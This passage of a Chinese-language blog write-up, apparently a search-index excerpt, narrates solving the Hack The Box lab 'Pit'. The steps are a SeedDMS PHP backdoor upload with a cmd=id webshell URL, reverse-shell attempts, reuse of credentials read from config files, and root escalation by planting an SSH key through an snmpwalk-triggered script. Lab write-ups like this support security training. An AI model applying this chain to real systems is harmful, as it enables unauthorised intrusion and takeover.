                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.4yvuvvpn6ok0.webp"
                     
                ></p>
<p>在下方发现cms名称为SeedDMS，搜一下有无exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.6b9op9t8jd00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.7gb1fy9aje80.webp"
                     
                ></p>
<p>在upgrade Note文件夹里面发现一个更新日志，是从5.1.10更新到了5.1.15版本</p>
<p>尝试利用一下，看能否成功</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.mtaz6l2zqa8.webp"
                     
                ></p>
<p>google搜索一下</p>
<p><code>https://packetstormsecurity.com/files/153383/SeedDMS-Remote-Command-Execution.html</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.2qjvdof6ny20.webp"
                     
                ></p>
<p>貌似是说在登录以后，新建一个文件，上传一个后门文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.44iwo3oa9h20.webp"
                     
                ></p>
<p>在docs&#x2F;users&#x2F;michelle目录下有权限新建文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.3p5u2dwkoqs0.webp"
                     
                ></p>
<p>之后访问<code>http://dms-pit.htb/seeddms51x/data/1048576/34/1.php?cmd=id</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5c8yb5ubdno0.webp"
                     
                ></p>
<p>文件id为34</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.6wsaw0vxc900.webp"
                     
                ></p>
<p>文件id为34</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5fn8tz2ohgw0.webp"
                     
                ></p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5u31bqa32ss0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.4s8l95tmlwc0.webp"
                     
                ></p>
<p>貌似弹不回来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.6csfk2jtlv00.webp"
                     
                ></p>
<p>在上三级目录下conf文件夹中，发现疑似配置文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.3m5899uuuw40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.zn76n2yp7k0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.1uzeekeyrpq8.webp"
                     
                ></p>
<p>用curl在试试</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.6mhvpnh0yto0.webp"
                     
                ></p>
<p>藏了不少东西</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.2veclg1hub00.webp"
                     
                ></p>
<p>发现数据库账号密码，尝试用这个密码登录一下9090端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.2wfkhs2h4v80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.z6yb3jog08w.webp"
                     
                ></p>
<p>在下方发现一个命令行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5uvlafvzb640.webp"
                     
                ></p>
<p>反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.56sppq8kqzo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.3ydycpzlx0q0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.2t35bjmqdty0.webp"
                     
                ></p>
<p>这发现一个很奇怪的文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.2yf91dwd42e0.webp"
                     
                ></p>
<p>权限也很奇怪，搜了一下之后</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.6oin8ylstzs0.webp"
                     
                ></p>
<p>是说这个文件具有ACL</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5bov6us2n6c0.webp"
                     
                ></p>
<p>可读写monitoring目录下的文件</p>
<p>并且之前执行snmpwalk扫描时，发现一个执行命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.3o6z8ocst1y0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.2u0ffi71dk60.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.3xo23go2ihs0.webp"
                     
                ></p>
<p>貌似是说当执行snmpwalk扫描时，就会触发monitor命令，以root权限执行monitoring下方所有以check开头的sh脚本文件</p>
<p>在本地准备一个写入密钥的命令</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.udcztctkhsw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.2k8pqwqcg8a0.webp"
                     
                ></p>
<p>此时只需要在执行snmpwalk扫描就会触发，将密钥写入root目录下</p>
<p><code>snmpwalk -v 2c -c public 10.10.10.241 .</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.27zsk8q5sgis.webp"
                     
                ></p>
<p>貌似该靶机有个定时任务，会定期清理monitoring目录下的所有文件，所以在扫描的过程中，不断地写入</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.5ydff6u5i8k0.webp"
                     
                ></p>
<p>执行成功后输出yes</p>
<p>登录root</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Pit/image.m97uviu9whs.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
</search>
